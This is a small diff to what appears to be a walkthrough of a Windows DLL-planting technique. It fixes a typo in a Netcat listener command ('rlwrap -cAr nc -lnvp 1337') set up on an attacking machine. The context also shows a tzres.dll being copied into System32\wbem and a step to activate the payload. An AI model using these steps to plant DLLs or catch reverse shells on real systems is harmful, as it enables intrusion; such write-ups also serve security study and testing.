@@ -88,7 +88,7 @@ copy tzres.dll C:\Windows\System32\wbem\
 6. Set up a Netcat listener on the attacking machine:
 
 ```
-rlwrap -cAr nc -lnvp 1337`
+rlwrap -cAr nc -lnvp 1337
 ```    
 
 7. Activate the payload by running:
